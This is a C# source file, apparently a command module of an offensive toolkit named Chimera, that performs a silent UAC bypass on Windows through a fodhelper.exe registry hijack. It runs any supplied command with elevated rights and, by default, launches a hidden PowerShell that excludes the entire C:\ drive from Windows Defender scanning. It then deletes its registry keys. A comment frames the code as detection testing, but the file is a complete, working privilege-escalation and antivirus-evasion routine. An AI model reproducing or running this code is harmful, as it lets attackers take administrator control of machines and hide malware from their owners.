using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // bypass — silent UAC elevation via fodhelper.exe registry hijack.
    // After elevation, adds a Defender exclusion for C:\ (for detection testing).
    // The elevated process runs whatever command is passed in the parameter.
    // If no command is given, spawns an elevated cmd.exe.
    public static class RunasExec
    {
        private const string FodHelperKey =
            @"Software\Classes\ms-settings\shell\open\command";

        public static string Execute(string command)
        {
            try
            {
                // Default: run the Defender exclusion elevated via fodhelper.
                // If a custom command is passed, run that instead.
                string target = string.IsNullOrEmpty(command)
                    ? @"powershell.exe -NoP -W Hidden -C ""Add-MpPreference -ExclusionPath 'C:\\'"""
                    : command;

                // 1. Write hijack keys — fodhelper will auto-elevate and execute target
                using (RegistryKey key =
                    Registry.CurrentUser.CreateSubKey(FodHelperKey))
                {
                    if (key == null)
                        return "[error] Could not create fodhelper registry key.";

                    // DelegateExecute must be present (even empty) for fodhelper to trigger
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    key.SetValue("", target, RegistryValueKind.String);
                }

                // 2. Launch fodhelper — spawns target elevated
                var psi = new ProcessStartInfo("fodhelper.exe")
                {
                    UseShellExecute = false,
                    CreateNoWindow  = true
                };
                Process.Start(psi);

                // Give fodhelper time to spawn and the exclusion to apply
                System.Threading.Thread.Sleep(3000);

                // 3. Clean up registry
                try
                {
                    Registry.CurrentUser.DeleteSubKeyTree(
                        @"Software\Classes\ms-settings", throwOnMissingSubKey: false);
                }
                catch { /* best-effort cleanup */ }

                return "[+] fodhelper UAC bypass triggered.\n" +
                       "    Elevated command: " + target + "\n" +
                       "    Registry keys cleaned up.\n" +
                       "    Defender exclusion for C:\\ should now be set.";
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }
    }
}
